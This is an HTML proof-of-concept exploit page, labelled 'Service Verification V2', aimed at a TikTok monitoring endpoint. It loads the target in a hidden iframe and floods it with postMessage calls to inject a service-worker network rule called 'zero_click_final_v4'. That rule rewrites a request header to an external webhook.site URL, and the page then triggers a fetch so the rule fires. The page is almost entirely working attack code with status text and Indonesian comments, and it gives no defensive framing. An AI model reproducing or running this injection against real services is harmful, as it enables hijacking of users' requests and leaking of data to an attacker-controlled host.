<!DOCTYPE html>
<html>
<head>
    <title>Service Verification V2</title>
</head>
<body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 20px;">
    <h1>[ STATUS: INJECTING ]</h1>
    
    <iframe id="pwn_gate" 
            src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
            style="display:none;"></iframe>

    <script>
        const gate = document.getElementById('pwn_gate');
        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";

        const payload = {
            source: "main_thread",
            eventName: "network_rule",
            data: [{
                ruleName: "zero_click_final_v4",
                global: true,
                conditions: [],
                handlers: [{
                    handler: "replace",
                    type: "header",
                    field: "X-Pns-Referrer",
                    value: webhook
                }]
            }]
        };

        gate.onload = function() {
            console.log("Gate Loaded (200 OK). Initializing injection...");
            
            // 1. Kirim payload berkali-kali agar ditangkap listener message di pns_logic.js
            let count = 0;
            const bomb = setInterval(() => {
                try {
                    gate.contentWindow.postMessage(payload, "*");
                } catch(e) {}
                count++;
                if (count > 30) {
                    clearInterval(bomb);
                    document.querySelector('h1').innerText = "[ STATUS: WAITING FOR CACHE ]";
                    
                    // 2. Jeda 5 detik: SW butuh waktu simpan rule ke Cache Storage
                    setTimeout(executeTrigger, 5000);
                }
            }, 200);
        };

        function executeTrigger() {
            document.querySelector('h1').innerText = "[ STATUS: TRIGGERING FETCH ]";
            console.log("Triggering fetch now...");
            
            // 3. Trigger fetch ke endpoint yang sama agar diintersep oleh SW
            fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { 
                mode: 'no-cors',
                cache: 'no-store' 
            }).then(() => {
                console.log("Request sent. Check Reqable/Webhook now!");
                document.querySelector('h1').innerText = "[ STATUS: DONE - CHECK REQABLE ]";
            });
        }
    </script>
</body>
</html>
